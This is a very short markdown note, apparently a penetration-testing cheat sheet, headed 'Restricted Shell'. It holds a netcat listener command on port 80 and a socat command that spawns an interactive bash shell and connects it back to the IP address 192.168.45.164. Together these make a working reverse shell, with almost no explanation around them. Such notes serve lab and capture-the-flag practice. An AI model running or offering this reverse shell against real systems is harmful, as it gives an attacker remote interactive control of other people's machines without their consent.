# Restricted Shell

we can find those mostly in weak public exploits.

---

## Syntax

Start up listener

```
nc -lvnp 80
```
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.164:80
```
